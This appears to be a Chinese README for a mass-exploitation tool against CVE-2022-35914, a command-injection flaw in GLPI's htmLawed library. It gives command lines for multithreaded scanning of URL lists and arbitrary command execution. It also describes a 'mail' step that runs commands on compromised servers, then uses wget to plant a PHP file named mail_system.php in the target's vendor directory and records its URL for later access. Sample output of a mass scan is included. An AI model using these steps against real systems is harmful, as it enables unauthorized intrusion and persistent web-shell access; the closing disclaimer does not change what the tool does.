# CVE-2022-35914 增强版漏洞检测工具

## 概述

这是一个基于CVE-2022-35914漏洞的增强版检测工具，支持批量检测、mail操作和多线程处理。该工具利用GLPI系统中的htmLawed第三方库漏洞进行命令注入。

## 功能特性

- ✅ **单个URL检测**: 检测指定URL是否存在CVE-2022-35914漏洞
- ✅ **批量漏洞检测**: 支持从文件读取多个URL进行批量检测
- ✅ **Mail操作**: 自动检测mail目录并下载mail_system.php
- ✅ **批量Mail操作**: 对多个URL执行mail检测和下载操作
- ✅ **多线程支持**: 支持多线程并发处理，提高效率
- ✅ **结果输出**: 支持将检测结果保存到文件
- ✅ **文件清理**: 自动删除现有文件，确保下载成功

## 安装依赖

```bash
pip install -r requirements.txt
```

依赖包：
- beautifulsoup4
- requests
- argparse

## 使用方法

### 1. 单个URL检测

```bash
# 基本检测
python CVE-2022-35914-enhanced.py -u http://target.com

# 执行自定义命令
python CVE-2022-35914-enhanced.py -u http://target.com -c "whoami"

# 仅检查漏洞，不执行命令
python CVE-2022-35914-enhanced.py -u http://target.com --check
```

### 2. 批量漏洞检测

```bash
# 使用默认10个线程
python CVE-2022-35914-enhanced.py -l urls.txt -o results.txt

# 使用20个线程
python CVE-2022-35914-enhanced.py -l urls.txt -o results.txt -t 20

# 使用5个线程（较保守）
python CVE-2022-35914-enhanced.py -l urls.txt -o results.txt -t 5
```

### 3. Mail操作（单个URL）

```bash
python CVE-2022-35914-enhanced.py -m http://target.com -o mail_result.txt
```

**Mail操作流程：**
1. 检测目标是否存在CVE-2022-35914漏洞
2. 执行 `ls ~` 命令检查是否存在mail目录
3. 如果发现mail目录，删除现有的mail_system.php文件
4. 下载 `mail_system.php` 到当前目录
5. 生成访问地址：`目标URL/vendor/htmlawed/htmlawed/mail_system.php`

### 4. 批量Mail操作

```bash
# 使用默认10个线程
python CVE-2022-35914-enhanced.py -lm urls.txt -o batch_mail_results.txt

# 使用5个线程（较保守）
python CVE-2022-35914-enhanced.py -lm urls.txt -o batch_mail_results.txt -t 5
```

## 参数说明

### 新增参数
- `-l URL_FILE`: 批量检测URL文件路径
- `-m TARGET_URL`: 对指定URL执行mail检测和下载操作
- `-lm BATCH_FILE`: 批量执行mail检测和下载操作
- `-o OUTPUT_FILE`: 输出结果到指定文件
- `-t THREADS`: 多线程数量 (默认: 10)

### 原有参数（保持兼容）
- `-u URL`: 单个URL测试
- `-c CMD`: 要执行的命令（默认: id）
- `-f HOOK`: PHP hook函数（默认: exec）
- `--check`: 仅检查漏洞，不执行命令
- `--user-agent`: 自定义User-Agent

## 输出示例

### 批量检测输出
```
[*] 开始批量检测漏洞...
[*] 使用 10 个线程
[*] 共发现 5 个URL需要检测
[+] 发现漏洞: http://example1.com
[-] 无漏洞: http://example2.com
...

[*] 检测完成! 发现 2 个存在漏洞的URL
[+] 存在漏洞的URL列表:
  - http://example1.com
  - https://target1.example.com
```

### Mail操作输出
```
[*] 开始对 http://target.com 执行mail操作...
[+] 目标存在漏洞，开始执行命令...
[+] 发现mail目录，开始下载mail_system.php...
[*] 删除现有mail_system.php文件...
[+] 下载命令已执行
[+] 访问地址: http://target.com/vendor/htmlawed/htmlawed/mail_system.php
```

## 文件格式

### URL文件格式 (urls.txt)
```
http://example1.com
http://example2.com
https://target1.example.com
https://target2.example.com
```

### 输出文件格式
- **漏洞检测结果**: 每行一个存在漏洞的URL
- **Mail操作结果**: 包含目标URL、访问地址和操作详情

## 技术细节

### 漏洞检测原理
1. 访问 `/vendor/htmlawed/htmlawed/htmLawedTest.php` 端点
2. 检查响应状态码和页面标题
3. 验证是否包含"htmLawed"标识

### Mail操作原理
1. 首先验证目标存在CVE-2022-35914漏洞
2. 执行 `ls ~` 命令检查用户主目录
3. 如果输出中包含"mail"字符串，认为存在mail目录
4. 删除现有的mail_system.php文件（如果存在）
5. 使用wget下载新的mail_system.php文件
6. 生成访问地址供后续使用

### 多线程实现
- 使用 `ThreadPoolExecutor` 管理线程池
- 线程安全的锁机制确保数据一致性
- 支持自定义线程数量，平衡效率和资源消耗

## 注意事项

1. **授权使用**: 仅在授权的测试环境中使用此工具
2. **目标验证**: 确保目标服务器存在CVE-2022-35914漏洞
3. **线程控制**: 根据目标服务器性能调整线程数量，避免造成过大压力
4. **网络安全**: 所有网络请求都禁用了SSL验证，请谨慎使用
5. **文件覆盖**: 输出文件会覆盖已存在的同名文件
6. **Mail操作**: wget命令通常无回显，脚本默认认为下载成功
7. **文件清理**: 自动删除现有文件，确保下载的文件名正确

## 性能优化

- **多线程并发**: 大幅提升批量操作效率
- **连接复用**: 使用Session保持连接
- **超时控制**: 设置合理的请求超时时间
- **错误处理**: 完善的异常处理机制

## 版本历史

- **v1.0**: 基础CVE-2022-35914检测功能
- **v2.0**: 添加批量检测和mail操作功能
- **v3.0**: 添加多线程支持和文件清理功能

## 免责声明

本工具仅用于安全研究和授权的渗透测试。使用者需要确保：
- 获得目标系统的明确授权
- 遵守当地法律法规
- 承担使用本工具的所有责任

作者不对使用本工具造成的任何损失或法律后果承担责任。